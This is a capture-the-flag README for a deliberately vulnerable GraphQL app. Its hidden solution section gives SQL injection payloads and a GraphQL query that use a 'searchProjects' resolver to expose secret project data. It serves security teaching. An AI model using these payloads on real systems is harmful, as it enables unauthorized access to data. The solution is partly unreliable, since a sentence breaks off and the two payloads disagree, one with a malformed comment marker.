# Shadow Graph - GraphQL Injection CTF Challenge

A web application vulnerable to GraphQL injection attacks, designed for CTFs.


## Challenge Description

The Shadow Organization has a new project management system that uses a query language for APIs. Your mission is to find the content of the flag !!!

## Hints

1. The application uses GraphQL at `/graphql`
2. You can login with the guest account (username: guest, password: guest)
3. The search functionality might be vulnerable to injection
4. The flag is stored as a secret in a classified project

## Solution

<details>
<summary>Click to reveal solution</summary>

### Vulnerability

The application has a GraphQL injection vulnerability in the `searchProjects` resolver. The >

### Exploitation Steps

1. Login with guest:guest credentials
2. Notice the search functionality uses a GraphQL query
3. Analyze the GraphQL schema (if GraphiQL is enabled, or through introspection)
4. Identify the `searchProjects` query parameter is vulnerable to SQL injection
5. Craft a payload to bypass the access control:

```
") OR 1=1 --
```

6. This will return all projects, including the secret one
7. Request the content of the secrets in the GraphQL query:

```graphql
{
  searchProjects(query: "' OR 1=1 -") {
    id
    name
    description
    isSecret
    secrets {
      id
      name
      content
      projectId
    }
  }
}
```

8. The flag should be revealed in the secret project's secrets.

</details>
```
